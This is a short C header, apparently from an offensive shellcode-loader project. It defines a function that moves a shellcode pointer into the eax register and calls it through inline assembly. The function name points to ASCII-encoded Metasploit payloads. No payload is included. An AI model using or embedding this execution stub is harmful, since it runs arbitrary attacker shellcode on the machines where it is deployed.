#pragma once

#include <stdio.h>
#include "../debug_print/debug_print.h"


// Currently ignores payload_info
void exec_shellcode_ASCIIMSF(unsigned char *shellcode, char *payload_info) {
	DEBUG_PRINT("exec_shellcode_ASCIIMSF called\n");
		
    // Check for NULL pointer to handle cases where no shellcode data was retrieved
    if(shellcode != NULL) {
	    register unsigned char* r asm("eax");
	    r=shellcode;
	    asm("call *%eax;");
    }
}
